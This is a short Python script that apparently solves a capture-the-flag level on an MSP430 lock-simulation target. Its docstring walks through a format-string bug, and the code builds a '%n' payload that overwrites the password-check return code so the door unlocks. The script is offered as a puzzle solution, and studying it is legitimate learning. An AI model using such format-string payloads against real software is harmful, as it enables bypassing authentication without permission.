#!/usr/bin/python

import utils
from binascii import hexlify, unhexlify

def up():
    '''_ is just a place-holder.
    Exploit happens here:

        4472:  b012 b044      call      #0x44b0 <test_password_valid>
        4476:  814f 0000      mov       r15, 0x0(sp)
        447a:  0b12           push      r11
        447c:  b012 c845      call      #0x45c8 <printf>
        4480:  2153           incd      sp
        4482:  3f40 0a00      mov       #0xa, r15
        4486:  b012 5045      call      #0x4550 <putchar>
        448a:  8193 0000      tst       0x0(sp)
        448e:  0324           jz        #0x4496 <main+0x5e>
        4490:  b012 da44      call      #0x44da <unlock_door>

    Notice how it does printf *after* testing the password but *before* checking
    the return code. printf is exploitable: it trusts the format string to tell
    it how many parameters were passed. If there were too few, you end up reading
    parts of the stack that you shouldn't and changing sp. With %n, you can *write*
    to the stack: the number of bytes written so far to @sp.

    Here, the first %n is to pop the stack and get sp pointing to the up[0]. The
    next %n will write the value 2 (number of bytes already written) to @sp. @sp
    is set to 0x2(sp), the location where it expects the return code from 
    test_password_valid. 2 == TRUE for tst's purposes, so it looks like the password
    is valid :)
    '''
    up = bytearray('__%n%n')
    up[0:2] = [0x36, 0x32]
    return up

if __name__ == '__main__':
    print 'username:password: %s' % hexlify(up())
